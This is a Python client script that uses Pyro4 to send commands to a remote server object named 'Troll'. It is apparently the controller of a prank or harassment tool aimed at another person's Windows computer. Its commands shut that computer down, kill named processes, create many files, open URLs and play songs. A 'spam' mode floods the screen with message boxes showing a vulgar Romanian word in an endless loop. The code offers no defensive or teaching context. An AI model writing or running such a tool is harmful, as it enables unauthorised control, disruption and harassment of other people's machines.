# saved as client.py
import Pyro4
import sys


while True:
    print("What is your action?")
    msg = sys.stdin.readline().strip()
    if msg == "echo" or msg == "msg":
        print("msg:")
        echo_msg = sys.stdin.readline().strip()
        # lookup object uri on name server and create a proxy for it
        echo_server = Pyro4.Proxy("PYRONAME:Troll")
        # call method on remote object
        echo_server.show_message(echo_msg)
    if msg == "win32box" or msg == "box":
        print("text:")
        win32box_text = sys.stdin.readline().strip()
        print("title:")
        win32box_title = sys.stdin.readline().strip()
        print("box type number:")
        win32box_type = sys.stdin.readline().strip()
        win32box_server = Pyro4.Proxy("PYRONAME:Troll")
        win32box_server.win_message(win32box_text, win32box_title, win32box_type)
    if msg == "open_page" or msg == "page":
        print("url:")
        page_url = sys.stdin.readline().strip()
        page_server = Pyro4.Proxy("PYRONAME:Troll")
        page_server.open_page(page_url)
    if msg == "shutdown":
        print("Shutting Down...")
        server = Pyro4.Proxy("PYRONAME:Troll")
        server.shutdown()
    if msg == "create_file" or msg == "cf":
        print("name:")
        file_name = sys.stdin.readline().strip()
        print("how many:")
        file_number = sys.stdin.readline().strip()
        file_server = Pyro4.Proxy("PYRONAME:Troll")
        file_server.create_files(file_number,file_name)
    if msg == "song":
        print("song:")
        songname = sys.stdin.readline().strip()
        song_server = Pyro4.Proxy("PYRONAME:Troll")
        song_server.song(songname)
    if msg == "kill":
        print("process name:")
        process_name = sys.stdin.readline().strip()
        kill_server = Pyro4.Proxy("PYRONAME:Troll")
        kill_server.kill(process_name)
    if msg == "spam":
        while True:
            win32box_server = Pyro4.Proxy("PYRONAME:Troll")
            win32box_server.win_message("muie", "muie", "1")
        
